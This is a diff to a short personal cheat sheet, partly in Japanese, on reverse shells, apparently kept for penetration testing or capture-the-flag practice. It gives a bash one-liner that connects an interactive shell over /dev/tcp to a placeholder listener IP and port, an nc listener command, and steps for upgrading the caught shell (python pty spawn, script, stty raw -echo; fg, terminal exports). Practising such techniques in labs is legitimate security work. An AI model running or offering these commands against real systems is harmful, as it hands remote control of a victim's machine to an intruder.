@@ -1,6 +1,11 @@
-```Reverse Shell
+#Reverse Shell
 /bin/bash -c '/bin/bash -i >& /dev/tcp/<待ち受けIP>/<待ち受けポート> 0>&1'
 nc -lvnp <待ち受けポート>
+
+#shellのアップグレード
+python3 -c "import pty;pty.spawn('/bin/bash')"
 script /dev/null -qc /bin/bash
 (inside the nc session) CTRL+Z;
+//どちらか
+stty raw -echo; fg
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
